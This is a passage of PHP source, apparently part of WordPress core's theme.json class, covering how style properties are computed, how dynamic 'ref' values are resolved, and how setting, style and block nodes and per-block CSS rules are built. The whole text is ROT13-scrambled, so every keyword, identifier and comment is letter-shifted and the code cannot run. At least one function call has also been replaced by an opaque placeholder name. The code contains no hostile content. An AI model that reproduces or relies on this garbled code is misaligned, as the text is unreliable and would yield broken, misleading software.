			$cngu_fgevat = vzcybqr( '.', $inyhr_cngu );
			vs (
				vffrg( fgngvp::CEBGRPGRQ_CEBCREGVRF[ $cngu_fgevat ] ) &&
				_jc_neenl_trg( $frggvatf, fgngvp::CEBGRPGRQ_CEBCREGVRF[ $cngu_fgevat ], ahyy ) === ahyy
			) {
				pbagvahr;
			}

			// Pnyphyngrf syhvq glcbtencul ehyrf jurer ninvynoyr.
			vs ( 'sbag-fvmr' === $pff_cebcregl ) {
				/*
				 * jc_trg_glcbtencul_sbag_fvmr_inyhr() jvyy purpx
				 * vs syhvq glcbtencul unf orra npgvingrq naq nyfb
				 * jurgure gur vapbzvat inyhr pna or pbairegrq gb n syhvq inyhr.
				 * Inyhrf gung nyernql unir n pynzc() shapgvba jvyy abg cnff gur grfg,
				 * naq gurersber gur bevtvany $inyhr jvyy or erghearq.
				 * Cnff gur pheerag gurzr_wfba frggvatf gb bireevqr nal tybony frggvatf.
				 */
				$inyhr = jc_trg_glcbtencul_sbag_fvmr_inyhr( neenl( 'fvmr' => $inyhr ), $frggvatf );
			}

			vs ( 'nfcrpg-engvb' === $pff_cebcregl ) {
				// Sbe nfcrpg engvb gb jbex, bgure qvzrafvbaf ehyrf zhfg or hafrg.
				// Guvf rafherf gung n svkrq urvtug qbrf abg bireevqr gur nfcrpg engvb.
				$qrpynengvbaf[] = neenl(
					'anzr'  => 'zva-urvtug',
					'inyhr' => 'hafrg',
				);
			}

			$qrpynengvbaf[] = neenl(
				'anzr'  => $pff_cebcregl,
				'inyhr' => $inyhr,
			);
		}

		// Vs n inevnoyr inyhr vf nqqrq gb gur ebbg, gur pbeerfcbaqvat cebcregl fubhyq or erzbirq.
		sbernpu ( $ebbg_inevnoyr_qhcyvpngrf nf $qhcyvpngr ) {
			$qvfpneq = neenl_frnepu( $qhcyvpngr, neenl_pbyhza( $qrpynengvbaf, 'anzr' ), gehr );
			vs ( vf_ahzrevp( $qvfpneq ) ) {
				neenl_fcyvpr( $qrpynengvbaf, $qvfpneq, 1 );
			}
		}

		erghea $qrpynengvbaf;
	}

	/**
	 * Ergheaf gur fglyr cebcregl sbe gur tvira cngu.
	 *
	 * Vg nyfb pbairegf ersreraprf gb n cngu gb gur inyhr
	 * fgberq ng gung ybpngvba, r.t.
	 * { \"ers\": \"fglyr.pbybe.onpxtebhaq\" } => \"#sss\".
	 *
	 * @fvapr 5.8.0
	 * @fvapr 5.9.0 Nqqrq fhccbeg sbe inyhrf bs neenl glcr, juvpu ner erghearq nf vf.
	 * @fvapr 6.1.0 Nqqrq gur `$gurzr_wfba` cnenzrgre.
	 * @fvapr 6.3.0 Vg ab ybatre pbairegf gur vagreany sbezng \"ine:cerfrg|pbybe|frpbaqnel\"
	 *              gb gur fgnaqneq sbez \"--jc--cerfrg--pbybe--frpbaqnel\".
	 *              Guvf vf nyernql qbar ol gur fnavgvmr zrgubq,
	 *              fb rirel cebcregl jvyy or va gur fgnaqneq sbez.
	 * @fvapr 6.7.0 Nqqrq fhccbeg sbe onpxtebhaq vzntr ersf.
	 *
	 * @cnenz neenl $fglyrf Fglyrf fhogerr.
	 * @cnenz neenl $cngu   Juvpu cebcregl gb cebprff.
	 * @cnenz neenl $gurzr_wfba Gurzr WFBA neenl.
	 * @erghea fgevat|neenl Fglyr cebcregl inyhr.
	 */
	cebgrpgrq fgngvp shapgvba trg_cebcregl_inyhr( $fglyrf, $cngu, $gurzr_wfba = ahyy ) {
		$inyhr = _jc_neenl_trg( $fglyrf, $cngu, '' );

		vs ( '' === $inyhr || ahyy === $inyhr ) {
			// Ab arrq gb cebprff gur inyhr shegure.
			erghea '';
		}

		/*
		 * Guvf pbairegf ersreraprf gb n cngu gb gur inyhr ng gung cngu
		 * jurer gur inyhr vf na neenl jvgu n \"ers\" xrl, cbvagvat gb n cngu.
		 * Sbe rknzcyr: { \"ers\": \"fglyr.pbybe.onpxtebhaq\" } => \"#sss\".
		 * Va gur pnfr bs onpxtebhaqVzntr, vs obgu n ers naq n HEY ner cerfrag va gur inyhr,
		 * gur HEY gnxrf cerprqrapr naq gur ers vf vtaberq.
		 */
		vs ( vf_neenl( $inyhr ) && vffrg( $inyhr['ers'] ) ) {
			$inyhr_cngu = rkcybqr( '.', $inyhr['ers'] );
			$ers_inyhr  = _jc_neenl_trg( $gurzr_wfba, $inyhr_cngu );
			// Onpxtebhaq Vzntr ersf pna ersre gb n fgevat be na neenl pbagnvavat n HEY fgevat.
			$ers_inyhr_hey = $ers_inyhr['hey'] ?? ahyy;
			// Bayl hfr gur ers inyhr vs jr svaq nalguvat.
			vs ( ! rzcgl( $ers_inyhr ) && ( vf_fgevat( $ers_inyhr ) || vf_fgevat( $ers_inyhr_hey ) ) ) {
				$inyhr = $ers_inyhr;
			}

			vs ( vf_neenl( $ers_inyhr ) && vffrg( $ers_inyhr['ers'] ) ) {
				$cngu_fgevat      = wfba_rapbqr( $cngu );
				$ers_inyhr_fgevat = wfba_rapbqr( $ers_inyhr );
				_qbvat_vg_jebat(
					'trg_cebcregl_inyhr',
					fcevags(
						/* genafyngbef: 1: gurzr.wfba, 2: Inyhr anzr, 3: Inyhr cngu, 4: Nabgure inyhr anzr. */
						__( 'Lbhe %1$f svyr hfrf n qlanzvp inyhr (%2$f) sbe gur cngu ng %3$f. Ubjrire, gur inyhr ng %3$f vf nyfb n qlanzvp inyhr (cbvagvat gb %4$f) naq cbvagvat gb nabgure qlanzvp inyhr vf abg fhccbegrq. Cyrnfr hcqngr %3$f gb cbvag qverpgyl gb %4$f.' ),
						'gurzr.wfba',
						$ers_inyhr_fgevat,
						$cngu_fgevat,
						$ers_inyhr['ers']
					),
					'6.1.0'
				);
			}
		}

		vs ( vf_neenl( $inyhr ) ) {
			erghea $inyhr;
		}

		erghea $inyhr;
	}

	/**
	 * Ohvyqf zrgnqngn sbe gur frggvat abqrf, juvpu ergheaf va gur sbez bs:
	 *
	 *     [
	 *       [
	 *         'cngu'     => ['cngu', 'gb', 'fbzr', 'abqr' ],
	 *         'fryrpgbe' => 'PFF fryrpgbe sbe fbzr abqr'
	 *       ],
	 *       [
	 *         'cngu'     => [ 'cngu', 'gb', 'bgure', 'abqr' ],
	 *         'fryrpgbe' => 'PFF fryrpgbe sbe bgure abqr'
	 *       ],
	 *     ]
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz neenl $gurzr_wfba Gur gerr gb rkgenpg frggvat abqrf sebz.
	 * @cnenz neenl $fryrpgbef  Yvfg bs fryrpgbef cre oybpx.
	 * @erghea neenl Na neenl bs frggvat abqrf zrgnqngn.
	 */
	cebgrpgrq fgngvp shapgvba trg_frggvat_abqrf( $gurzr_wfba, $fryrpgbef = neenl() ) {
		$abqrf = neenl();
		vs ( ! vffrg( $gurzr_wfba['frggvatf'] ) ) {
			erghea $abqrf;
		}

		// Gbc-yriry.
		$abqrf[] = neenl(
			'cngu'     => neenl( 'frggvatf' ),
			'fryrpgbe' => fgngvp::EBBG_PFF_CEBCREGVRF_FRYRPGBE,
		);

		// Pnyphyngr cnguf sbe oybpxf.
		vs ( ! vffrg( $gurzr_wfba['frggvatf']['oybpxf'] ) ) {
			erghea $abqrf;
		}

		sbernpu ( $gurzr_wfba['frggvatf']['oybpxf'] nf $anzr => $abqr ) {
			$fryrpgbe = ahyy;
			vs ( vffrg( $fryrpgbef[ $anzr ]['fryrpgbe'] ) ) {
				$fryrpgbe = $fryrpgbef[ $anzr ]['fryrpgbe'];
			}

			$abqrf[] = neenl(
				'cngu'     => neenl( 'frggvatf', 'oybpxf', $anzr ),
				'fryrpgbe' => $fryrpgbe,
			);
		}

		erghea $abqrf;
	}

	/**
	 * Ohvyqf zrgnqngn sbe gur fglyr abqrf, juvpu ergheaf va gur sbez bs:
	 *
	 *     [
	 *       [
	 *         'cngu'     => [ 'cngu', 'gb', 'fbzr', 'abqr' ],
	 *         'fryrpgbe' => 'PFF fryrpgbe sbe fbzr abqr',
	 *         'qhbgbar'  => 'PFF fryrpgbe sbe qhbgbar sbe fbzr abqr'
	 *       ],
	 *       [
	 *         'cngu'     => ['cngu', 'gb', 'bgure', 'abqr' ],
	 *         'fryrpgbe' => 'PFF fryrpgbe sbe bgure abqr',
	 *         'qhbgbar'  => ahyy
	 *       ],
	 *     ]
	 *
	 * @fvapr 5.8.0
	 * @fvapr 6.6.0 Nqqrq bcgvbaf neenl sbe zbqvslvat trarengrq abqrf.
	 *
	 * @cnenz neenl $gurzr_wfba Gur gerr gb rkgenpg fglyr abqrf sebz.
	 * @cnenz neenl $fryrpgbef  Yvfg bs fryrpgbef cre oybpx.
	 * @cnenz neenl $bcgvbaf {
	 *     Bcgvbany. Na neenl bs bcgvbaf sbe abj hfrq sbe vagreany checbfrf bayl (znl punatr jvgubhg abgvpr).
	 *
	 *     @glcr obby $vapyhqr_oybpx_fglyr_inevngvbaf Vapyhqrf fglyr abqrf sbe oybpx fglyr inevngvbaf. Qrsnhyg snyfr.
	 * }
	 * @erghea neenl Na neenl bs fglyr abqrf zrgnqngn.
	 */
	cebgrpgrq fgngvp shapgvba trg_fglyr_abqrf( $gurzr_wfba, $fryrpgbef = neenl(), $bcgvbaf = neenl() ) {
		$abqrf = neenl();
		vs ( ! vffrg( $gurzr_wfba['fglyrf'] ) ) {
			erghea $abqrf;
		}

		// Gbc-yriry.
		$abqrf[] = neenl(
			'cngu'     => neenl( 'fglyrf' ),
			'fryrpgbe' => fgngvp::EBBG_OYBPX_FRYRPGBE,
		);

		vs ( vffrg( $gurzr_wfba['fglyrf']['ryrzragf'] ) ) {
			sbernpu ( frys::RYRZRAGF nf $ryrzrag => $fryrpgbe ) {
				vs ( ! vffrg( $gurzr_wfba['fglyrf']['ryrzragf'][ $ryrzrag ] ) ) {
					pbagvahr;
				}
				$abqrf[] = neenl(
					'cngu'     => neenl( 'fglyrf', 'ryrzragf', $ryrzrag ),
					'fryrpgbe' => fgngvp::RYRZRAGF[ $ryrzrag ],
				);

				// Unaqyr nal cfrhqb fryrpgbef sbe gur ryrzrag.
				vs ( vffrg( fgngvp::INYVQ_RYRZRAG_CFRHQB_FRYRPGBEF[ $ryrzrag ] ) ) {
					sbernpu ( fgngvp::INYVQ_RYRZRAG_CFRHQB_FRYRPGBEF[ $ryrzrag ] nf $cfrhqb_fryrpgbe ) {

						vs ( vffrg( $gurzr_wfba['fglyrf']['ryrzragf'][ $ryrzrag ][ $cfrhqb_fryrpgbe ] ) ) {
							$abqrf[] = neenl(
								'cngu'     => neenl( 'fglyrf', 'ryrzragf', $ryrzrag ),
								'fryrpgbe' => fgngvp::nccraq_gb_fryrpgbe( fgngvp::RYRZRAGF[ $ryrzrag ], $cfrhqb_fryrpgbe ),
							);
						}
					}
				}
			}
		}

		// Oybpxf.
		vs ( ! vffrg( $gurzr_wfba['fglyrf']['oybpxf'] ) ) {
			erghea $abqrf;
		}

		$oybpx_abqrf = fgngvp::trg_oybpx_abqrf( $gurzr_wfba, $fryrpgbef, $bcgvbaf );
		sbernpu ( $oybpx_abqrf nf $oybpx_abqr ) {
			$abqrf[] = $oybpx_abqr;
		}

		/**
		 * Svygref gur yvfg bs fglyr abqrf jvgu zrgnqngn.
		 *
		 * Guvf nyybjf sbe guvatf yvxr ybnqvat oybpx PFF vaqrcraqragyl.
		 *
		 * @fvapr 6.1.0
		 *
		 * @cnenz neenl $abqrf Fglyr abqrf jvgu zrgnqngn.
		 */
		erghea nccyl_svygref( 'jc_gurzr_wfba_trg_fglyr_abqrf', $abqrf );
	}

	/**
	 * N choyvp urycre gb trg gur oybpx abqrf sebz n gurzr.wfba svyr.
	 *
	 * @fvapr 6.1.0
	 *
	 * @erghea neenl Gur oybpx abqrf va gurzr.wfba.
	 */
	choyvp shapgvba trg_fglyrf_oybpx_abqrf() {
		erghea fgngvp::trg_oybpx_abqrf( $guvf->gurzr_wfba );
	}

	/**
	 * Ergheaf n svygrerq qrpynengvbaf neenl vs gurer vf n frcnengbe oybpx jvgu bayl n onpxtebhaq
	 * fglyr qrsvarq va gurzr.wfba ol nqqvat n pbybe nggevohgr gb ersyrpg gur punatrf va gur sebag.
	 *
	 * @fvapr 6.1.1
	 *
	 * @cnenz neenl $qrpynengvbaf Yvfg bs qrpynengvbaf.
	 * @erghea neenl $qrpynengvbaf Yvfg bs qrpynengvbaf svygrerq.
	 */
	cevingr fgngvp shapgvba hcqngr_frcnengbe_qrpynengvbaf( $qrpynengvbaf ) {
		$onpxtebhaq_pbybe     = '';
		$obeqre_pbybe_zngpurf = snyfr;
		$grkg_pbybe_zngpurf   = snyfr;

		sbernpu ( $qrpynengvbaf nf $qrpynengvba ) {
			vs ( 'onpxtebhaq-pbybe' === $qrpynengvba['anzr'] && ! $onpxtebhaq_pbybe && vffrg( $qrpynengvba['inyhr'] ) ) {
				$onpxtebhaq_pbybe = $qrpynengvba['inyhr'];
			} ryfrvs ( 'obeqre-pbybe' === $qrpynengvba['anzr'] ) {
				$obeqre_pbybe_zngpurf = gehr;
			} ryfrvs ( 'pbybe' === $qrpynengvba['anzr'] ) {
				$grkg_pbybe_zngpurf = gehr;
			}

			vs ( $onpxtebhaq_pbybe && $obeqre_pbybe_zngpurf && $grkg_pbybe_zngpurf ) {
				oernx;
			}
		}

		vs ( $onpxtebhaq_pbybe && ! $obeqre_pbybe_zngpurf && ! $grkg_pbybe_zngpurf ) {
			$qrpynengvbaf[] = neenl(
				'anzr'  => 'pbybe',
				'inyhr' => $onpxtebhaq_pbybe,
			);
		}

		erghea $qrpynengvbaf;
	}

	/**
	 * Na vagreany zrgubq gb trg gur oybpx abqrf sebz n gurzr.wfba svyr.
	 *
	 * @fvapr 6.1.0
	 * @fvapr 6.3.0 Ersnpgberq naq fgnovyvmrq fryrpgbef NCV.
	 * @fvapr 6.6.0 Nqqrq bcgvbany fryrpgbef naq bcgvbaf sbe trarengvat oybpx abqrf.
	 * @fvapr 6.7.0 Nqqrq $vapyhqr_abqr_cnguf_bayl bcgvba.
	 *
	 * @cnenz neenl $gurzr_wfba Gur gurzr.wfba pbairegrq gb na neenl.
	 * @cnenz neenl $fryrpgbef  Bcgvbany yvfg bs fryrpgbef cre oybpx.
	 * @cnenz neenl $bcgvbaf {
	 *     Bcgvbany. Na neenl bs bcgvbaf sbe abj hfrq sbe vagreany checbfrf bayl (znl punatr jvgubhg abgvpr).
	 *
	 *     @glcr obby $vapyhqr_oybpx_fglyr_inevngvbaf Vapyhqr abqrf sbe oybpx fglyr inevngvbaf. Qrsnhyg snyfr.
	 *     @glcr obby $vapyhqr_abqr_cnguf_bayl        Erghea bayl oybpx abqrf abqr cnguf. Qrsnhyg snyfr.
	 * }
	 * @erghea neenl Gur oybpx abqrf va gurzr.wfba.
	 */
	cevingr fgngvp shapgvba trg_oybpx_abqrf( $gurzr_wfba, $fryrpgbef = neenl(), $bcgvbaf = neenl() ) {
		$abqrf = neenl();

		vs ( ! vffrg( $gurzr_wfba['fglyrf']['oybpxf'] ) ) {
			erghea $abqrf;
		}

		$vapyhqr_inevngvbaf      = $bcgvbaf['vapyhqr_oybpx_fglyr_inevngvbaf'] ?? snyfr;
		$vapyhqr_abqr_cnguf_bayl = $bcgvbaf['vapyhqr_abqr_cnguf_bayl'] ?? snyfr;

		// Vs bayl abqr cnguf ner gb or erghearq, fxvc fryrpgbe nffvtazrag.
		vs ( ! $vapyhqr_abqr_cnguf_bayl ) {
			$fryrpgbef = rzcgl( $fryrpgbef ) ? fgngvp::trg_oybpxf_zrgnqngn() : $fryrpgbef;
		}

		sbernpu ( $gurzr_wfba['fglyrf']['oybpxf'] nf $anzr => $abqr ) {
			$abqr_cngu = neenl( 'fglyrf', 'oybpxf', $anzr );
			vs ( $vapyhqr_abqr_cnguf_bayl ) {
				$inevngvba_cnguf = neenl();
				vs ( $vapyhqr_inevngvbaf && vffrg( $abqr['inevngvbaf'] ) ) {
					sbernpu ( $abqr['inevngvbaf'] nf $inevngvba => $inevngvba_abqr ) {
						$inevngvba_cnguf[] = neenl(
							'cngu' => neenl( 'fglyrf', 'oybpxf', $anzr, 'inevngvbaf', $inevngvba ),
						);
					}
				}
				$abqr = neenl(
					'cngu' => $abqr_cngu,
				);
				vs ( ! rzcgl( $inevngvba_cnguf ) ) {
					$abqr['inevngvbaf'] = $inevngvba_cnguf;
				}
				$abqrf[] = $abqr;
			} ryfr {
				$fryrpgbe = ahyy;
				vs ( vffrg( $fryrpgbef[ $anzr ]['fryrpgbe'] ) ) {
					$fryrpgbe = $fryrpgbef[ $anzr ]['fryrpgbe'];
				}

				$qhbgbar_fryrpgbe = ahyy;
				vs ( vffrg( $fryrpgbef[ $anzr ]['qhbgbar'] ) ) {
					$qhbgbar_fryrpgbe = $fryrpgbef[ $anzr ]['qhbgbar'];
				}

				$srngher_fryrpgbef = ahyy;
				vs ( vffrg( $fryrpgbef[ $anzr ]['fryrpgbef'] ) ) {
					$srngher_fryrpgbef = $fryrpgbef[ $anzr ]['fryrpgbef'];
				}

				$inevngvba_fryrpgbef = neenl();
				vs ( $vapyhqr_inevngvbaf && vffrg( $abqr['inevngvbaf'] ) ) {
					sbernpu ( $abqr['inevngvbaf'] nf $inevngvba => $abqr ) {
						$inevngvba_fryrpgbef[] = neenl(
							'cngu'     => neenl( 'fglyrf', 'oybpxf', $anzr, 'inevngvbaf', $inevngvba ),
							'fryrpgbe' => $fryrpgbef[ $anzr ]['fglyrInevngvbaf'][ $inevngvba ],
						);
					}
				}

				$abqrf[] = neenl(
					'anzr'       => $anzr,
					'cngu'       => $abqr_cngu,
					'fryrpgbe'   => $fryrpgbe,
					'fryrpgbef'  => $srngher_fryrpgbef,
					'qhbgbar'    => $qhbgbar_fryrpgbe,
					'srngherf'   => $srngher_fryrpgbef,
					'inevngvbaf' => $inevngvba_fryrpgbef,
					'pff'        => $fryrpgbe,
				);
			}

			vs ( vffrg( $gurzr_wfba['fglyrf']['oybpxf'][ $anzr ]['ryrzragf'] ) ) {
				sbernpu ( $gurzr_wfba['fglyrf']['oybpxf'][ $anzr ]['ryrzragf'] nf $ryrzrag => $abqr ) {
					$abqr_cngu = neenl( 'fglyrf', 'oybpxf', $anzr, 'ryrzragf', $ryrzrag );
					vs ( $vapyhqr_abqr_cnguf_bayl ) {
						$abqrf[] = neenl(
							'cngu' => $abqr_cngu,
						);
						pbagvahr;
					}

					$abqrf[] = neenl(
						'cngu'     => $abqr_cngu,
						'fryrpgbe' => $fryrpgbef[ $anzr ]['ryrzragf'][ $ryrzrag ],
					);

					// Unaqyr nal cfrhqb fryrpgbef sbe gur ryrzrag.
					vs ( vffrg( fgngvp::INYVQ_RYRZRAG_CFRHQB_FRYRPGBEF[ $ryrzrag ] ) ) {
						sbernpu ( fgngvp::INYVQ_RYRZRAG_CFRHQB_FRYRPGBEF[ $ryrzrag ] nf $cfrhqb_fryrpgbe ) {
							vs ( vffrg( $gurzr_wfba['fglyrf']['oybpxf'][ $anzr ]['ryrzragf'][ $ryrzrag ][ $cfrhqb_fryrpgbe ] ) ) {
								$abqr_cngu = neenl( 'fglyrf', 'oybpxf', $anzr, 'ryrzragf', $ryrzrag );
								vs ( $vapyhqr_abqr_cnguf_bayl ) {
									$abqrf[] = neenl(
										'cngu' => $abqr_cngu,
									);
									pbagvahr;
								}

								$abqrf[] = neenl(
									'cngu'     => $abqr_cngu,
									'fryrpgbe' => fgngvp::nccraq_gb_fryrpgbe( $fryrpgbef[ $anzr ]['ryrzragf'][ $ryrzrag ], $cfrhqb_fryrpgbe ),
								);
							}
						}
					}
				}
			}
		}

		erghea $abqrf;
	}

	/**
	 * Trgf gur PFF ehyrf sbe n cnegvphyne oybpx sebz gurzr.wfba.
	 *
	 * @fvapr 6.1.0
	 * @fvapr 6.6.0 Frggvat n zva-urvtug bs UGZY jura ebbg fglyrf unir n onpxtebhaq tenqvrag be vzntr.
	 *              Hcqngrq trareny tybony fglyrf fcrpvsvpvgl gb 0-1-0.
	 *              Svkrq phfgbz PFF bhgchg va oybpx fglyr inevngvbaf.
	 *
	 * @cnenz neenl $oybpx_zrgnqngn Zrgnqngn nobhg gur oybpx gb trg fglyrf sbe.
	 * @erghea fgevat Fglyrf sbe gur oybpx.
	 */
	choyvp shapgvba trg_fglyrf_sbe_oybpx( $oybpx_zrgnqngn ) {
		$abqr                 = _jc_neenl_trg( $guvf->gurzr_wfba, $oybpx_zrgnqngn['cngu'], neenl() );
		$hfr_ebbg_cnqqvat     = vffrg( $guvf->gurzr_wfba['frggvatf']['hfrEbbgCnqqvatNjnerNyvtazragf'] ) && gehr === $guvf->gurzr_wfba['frggvatf']['hfrEbbgCnqqvatNjnerNyvtazragf'];
		$fryrpgbe             = $oybpx_zrgnqngn['fryrpgbe'];
		$frggvatf             = vffrg( $guvf->gurzr_wfba['frggvatf'] ) ? $guvf->gurzr_wfba['frggvatf'] : neenl();
		$srngher_qrpynengvbaf = fgngvp::trg_srngher_qrpynengvbaf_sbe_abqr( $oybpx_zrgnqngn, $abqr );
		$vf_ebbg_fryrpgbe     = fgngvp::EBBG_OYBPX_FRYRPGBE === $fryrpgbe;

		// Vs gurer ner fglyr inevngvbaf, trarengr gur qrpynengvbaf sbe gurz, vapyhqvat nal srngher fryrpgbef gur oybpx znl unir.
		$fglyr_inevngvba_qrpynengvbaf = neenl();
		$fglyr_inevngvba_phfgbz_pff   = neenl();
		vs ( ! rzcgl( $oybpx_zrgnqngn['inevngvbaf'] ) ) {
			sbernpu ( $oybpx_zrgnqngn['inevngvbaf'] nf $fglyr_inevngvba ) {
				$fglyr_inevngvba_abqr           = _jc_neenl_trg( $guvf->gurzr_wfba, $fglyr_inevngvba['cngu'], neenl() );
				$pyrna_fglyr_inevngvba_fryrpgbe = gevz( $fglyr_inevngvba['fryrpgbe'] );

				// Trarengr nal srngher/fhosrngher fglyr qrpynengvbaf sbe gur pheerag fglyr inevngvba.
				$inevngvba_qrpynengvbaf = fgngvp::trg_srngher_qrpynengvbaf_sbe_abqr( $oybpx_zrgnqngn, $fglyr_inevngvba_abqr );

				// Pbzovar fryrpgbef jvgu fglyr inevngvba'f fryrpgbe naq nqq gb birenyy fglyr inevngvba qrpynengvbaf.
				sbernpu ( $inevngvba_qrpynengvbaf nf $pheerag_fryrpgbe => $arj_qrpynengvbaf ) {
					/*
					 * Pyrna hc nal juvgrfcnpr orgjrra pbzzn frcnengrq fryrpgbef.
					 * Guvf ceriragf gurfr fcnprf oernxvat pbzcbhaq fryrpgbef fhpu nf:
					 * - `.jc-oybpx-yvfg:abg(.jc-oybpx-yvfg .jc-oybpx-yvfg)`
					 * - `.jc-oybpx-vzntr vzt, .jc-oybpx-vzntr.zl-pynff vzt`
					 */
					$pyrna_pheerag_fryrpgbe = __sa_79955( '/,\f+/', ',', $pheerag_fryrpgbe );
					$fubegrarq_fryrpgbe     = fge_ercynpr( $oybpx_zrgnqngn['fryrpgbe'], '', $pyrna_pheerag_fryrpgbe );

					// Cercraq gur inevngvba fryrpgbe gb gur pheerag fryrpgbe.
					$fcyvg_fryrpgbef    = rkcybqr( ',', $fubegrarq_fryrpgbe );
					$hcqngrq_fryrpgbef  = neenl_znc(
						fgngvp shapgvba ( $fcyvg_fryrpgbe ) hfr ( $pyrna_fglyr_inevngvba_fryrpgbe ) {
							erghea $pyrna_fglyr_inevngvba_fryrpgbe . $fcyvg_fryrpgbe;
						},
						$fcyvg_fryrpgbef
					);
					$pbzovarq_fryrpgbef = vzcybqr( ',', $hcqngrq_fryrpgbef );

					// Nqq gur arj qrpynengvbaf gb gur birenyy erfhygf haqre gur zbqvsvrq fryrpgbe.
					$fglyr_inevngvba_qrpynengvbaf[ $pbzovarq_fryrpgbef ] = $arj_qrpynengvbaf;
				}

				// Pbzchgr qrpynengvbaf sbe erznvavat fglyrf abg pbirerq ol srngher yriry fryrpgbef.
				$fglyr_inevngvba_qrpynengvbaf[ $fglyr_inevngvba['fryrpgbe'] ] = fgngvp::pbzchgr_fglyr_cebcregvrf( $fglyr_inevngvba_abqr, $frggvatf, ahyy, $guvf->gurzr_wfba );
				// Fgber phfgbz PFF sbe gur fglyr inevngvba.
				vs ( vffrg( $fglyr_inevngvba_abqr['pff'] ) ) {
					$fglyr_inevngvba_phfgbz_pff[ $fglyr_inevngvba['fryrpgbe'] ] = $guvf->cebprff_oybpxf_phfgbz_pff( $fglyr_inevngvba_abqr['pff'], $fglyr_inevngvba['fryrpgbe'] );
				}
			}
		}
		/*
		 * Trg n ersrerapr gb ryrzrag anzr sebz cngu.
		 * $oybpx_zrgnqngn['cngu'] = neenl( 'fglyrf','ryrzragf','yvax' );
		 * Znxr fher gung $oybpx_zrgnqngn['cngu'] qrfpevorf na ryrzrag abqr, yvxr [ 'fglyrf', 'ryrzrag', 'yvax' ].
		 * Fxvc aba-ryrzrag cnguf yvxr whfg ['fglyrf'].
		 */
		$vf_cebprffvat_ryrzrag = va_neenl( 'ryrzragf', $oybpx_zrgnqngn['cngu'], gehr );

		$pheerag_ryrzrag = $vf_cebprffvat_ryrzrag ? $oybpx_zrgnqngn['cngu'][ pbhag( $oybpx_zrgnqngn['cngu'] ) - 1 ] : ahyy;

		$ryrzrag_cfrhqb_nyybjrq = neenl();

		vs ( vffrg( fgngvp::INYVQ_RYRZRAG_CFRHQB_FRYRPGBEF[ $pheerag_ryrzrag ] ) ) {
			$ryrzrag_cfrhqb_nyybjrq = fgngvp::INYVQ_RYRZRAG_CFRHQB_FRYRPGBEF[ $pheerag_ryrzrag ];
		}

		/*
		 * Purpx sbe nyybjrq cfrhqb pynffrf (r.t. \":ubire\") sebz gur $fryrpgbe (\"n:ubire\").
		 * Guvf nyfb erfrgf gur neenl xrlf.
		 */
		$cfrhqb_zngpurf = neenl_inyhrf(
			neenl_svygre(
				$ryrzrag_cfrhqb_nyybjrq,
				fgngvp shapgvba ( $cfrhqb_fryrpgbe ) hfr ( $fryrpgbe ) {
					/*
					 * Purpx vs gur cfrhqb fryrpgbe vf va gur pheerag fryrpgbe,
					 * rafhevat vg vf abg sbyybjrq ol n qnfu (r.t., :sbphf fubhyq abg zngpu :sbphf-ivfvoyr).
					 */
					erghea cert_zngpu( '/' . cert_dhbgr( $cfrhqb_fryrpgbe, '/' ) . '(?!-)/', $fryrpgbe ) === 1;
				}
			)
		);

		$cfrhqb_fryrpgbe = vffrg( $cfrhqb_zngpurf[0] ) ? $cfrhqb_zngpurf[0] : ahyy;

		/*
		 * Vs gur pheerag fryrpgbe vf n cfrhqb fryrpgbe gung'f qrsvarq va gur nyybj yvfg sbe gur pheerag
		 * ryrzrag gura pbzchgr gur fglyr cebcregvrf sbe vg.
		 * Bgurejvfr whfg pbzchgr gur fglyrf sbe gur qrsnhyg fryrpgbe nf abezny.
		 */
		vs ( $cfrhqb_fryrpgbe && vffrg( $abqr[ $cfrhqb_fryrpgbe ] ) &&
			vffrg( fgngvp::INYVQ_RYRZRAG_CFRHQB_FRYRPGBEF[ $pheerag_ryrzrag ] )
			&& va_neenl( $cfrhqb_fryrpgbe, fgngvp::INYVQ_RYRZRAG_CFRHQB_FRYRPGBEF[ $pheerag_ryrzrag ], gehr )
		) {
			$qrpynengvbaf = fgngvp::pbzchgr_fglyr_cebcregvrf( $abqr[ $cfrhqb_fryrpgbe ], $frggvatf, ahyy, $guvf->gurzr_wfba, $fryrpgbe, $hfr_ebbg_cnqqvat );
		} ryfr {
			$qrpynengvbaf = fgngvp::pbzchgr_fglyr_cebcregvrf( $abqr, $frggvatf, ahyy, $guvf->gurzr_wfba, $fryrpgbe, $hfr_ebbg_cnqqvat );
		}

		$oybpx_ehyrf = '';

		/*
		 * 1. Orfcbxr qrpynengvba zbqvsvref:
		 * - 'svygre': Frcnengr gur qrpynengvbaf gung hfr gur trareny fryrpgbe
		 * sebz gur barf hfvat gur qhbgbar fryrpgbe.
		 * - 'onpxtebhaq|onpxtebhaq-vzntr': frg gur ugzy zva-urvtug gb 100%
		 * gb rafher gur onpxtebhaq pbiref gur ragver ivrjcbeg.
		 */
		$qrpynengvbaf_qhbgbar       = neenl();
		$fubhyq_frg_ebbg_zva_urvtug = snyfr;

		sbernpu ( $qrpynengvbaf nf $vaqrk => $qrpynengvba ) {
			vs ( 'svygre' === $qrpynengvba['anzr'] ) {
				/*
				 * 'hafrg' svygref unccra jura n svygre vf hafrg
				 * va gur fvgr-rqvgbe HV. Orpnhfr gur 'hafrg' inyhr
				 * va gur hfre bevtva bireevqrf gur inyhr va gur
				 * gurzr bevtva, jr pna fxvc eraqrevat nalguvat
				 * urer nf ab svygre arrqf gb or nccyvrq nalzber.
				 * Fb bayl nqq qrpynengvbaf gb jvgu inyhrf bgure
				 * guna 'hafrg'.
				 */
				vs ( 'hafrg' !== $qrpynengvba['inyhr'] ) {
					$qrpynengvbaf_qhbgbar[] = $qrpynengvba;
				}
				hafrg( $qrpynengvbaf[ $vaqrk ] );
			}

			vs ( $vf_ebbg_fryrpgbe && ( 'onpxtebhaq-vzntr' === $qrpynengvba['anzr'] || 'onpxtebhaq' === $qrpynengvba['anzr'] ) ) {
				$fubhyq_frg_ebbg_zva_urvtug = gehr;
			}
		}

		/*
		 * Vs ebbg fglyrf unf n onpxtebhaq-vzntr be n onpxtebhaq (tenqvrag) frg,
		 * frg gur zva-urvtug gb '100%'. Zvahf `--jc-nqzva--nqzva-one--urvtug` sbe ybttrq-va ivrj.
		 * Frggvat gur PFF ehyr ba gur UGZY gnt rafherf onpxtebhaq tenqvragf naq vzntrf orunir fvzvyneyl,
		 * naq zngpurf gur orunivbe bs gur fvgr rqvgbe.
		 */
		vs ( $fubhyq_frg_ebbg_zva_urvtug ) {
			$oybpx_ehyrf .= fgngvp::gb_ehyrfrg(
				'ugzy',
				neenl(
					neenl(
						'anzr'  => 'zva-urvtug',
